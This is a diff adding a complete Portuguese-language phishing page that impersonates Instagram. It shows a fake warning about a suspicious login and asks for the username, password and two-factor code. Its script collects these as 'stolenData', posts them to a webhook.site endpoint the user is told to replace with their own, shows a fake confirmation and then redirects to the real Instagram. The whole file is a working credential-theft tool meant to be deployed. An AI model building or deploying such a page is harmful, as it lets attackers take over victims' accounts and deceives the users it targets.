@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 10px;
+            color: #262626;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            text-align: left;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .form-group label {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 14px;
+            color: #8e8e8e;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 8px;
+            font-size: 12px;
+            color: #0095f6;
+            background: white;
+            padding: 0 4px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 12px 12px 40px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background: #fafafa;
+            font-size: 14px;
+            color: #262626;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0095f6;
+            background: white;
+        }
+        
+        input::placeholder {
+            color: transparent;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin: 10px 0;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            background: #007bb5;
+        }
+        
+        .submit-btn:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #0095f6;
+        }
+        
+        .success {
+            display: none;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff40;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                margin: 0;
+                border-radius: 0;
+                box-shadow: none;
+                max-width: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+        
+        <h1 class="title">Confirme sua identidade</h1>
+        <p class="subtitle">Para manter sua conta segura, precisamos verificar sua identidade. Insira suas credenciais abaixo.</p>
+        
+        <div class="alert">
+            <strong>⚠️ Aviso de segurança:</strong> Detectamos login suspeito da sua conta. Confirme agora sua indentidade para evitar bloqueio.
+        </div>
+        
+        <form id="instagramForm">
+            <div class="form-group">
+                <input type="text" id="username" required>
+                <label for="username">Usuário ou Email</label>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" required>
+                <label for="password">Senha</label>
+            </div>
+            
+            <div class="form-group">
+                <input type="text" id="code" placeholder="Opcional" maxlength="6">
+                <label for="code">Código de autenticação</label>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Confirmar identidade
+            </button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            Verificando sua identidade...
+        </div>
+        
+        <div class="success" id="success">
+            ✅ Identidade confirmada com sucesso!<br>
+            Redirecionando para o Instagram...
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('instagramForm');
+        const loading = document.getElementById('loading');
+        const success = document.getElementById('success');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const code = document.getElementById('code').value;
+            
+            // Captura completa dos dados
+            const stolenData = {
+                timestamp: new Date().toISOString(),
+                username: username,
+                email: username.includes('@') ? username : null,
+                password: password,
+                auth_code: code || 'N/A',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer
+            };
+            
+            console.log('=== INSTAGRAM DADOS CAPTURADOS ===', stolenData);
+            
+            // Envio para webhook (substitua pelo seu)
+            fetch('https://webhook.site/seu-webhook-instagram', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(stolenData)
+            }).catch(err => console.log('Dados capturados:', stolenData));
+            
+            // Animações realistas
+            form.style.display = 'none';
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            
+            setTimeout(() => {
+                loading.style.display = 'none';
+                success.style.display = 'block';
+                
+                // Redireciona pro Instagram real
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com';
+                }, 2500);
+            }, 1500);
+        });
+        
+        // Auto-focus
+        document.getElementById('username').focus();
+    </script>
+</body>
+</html>
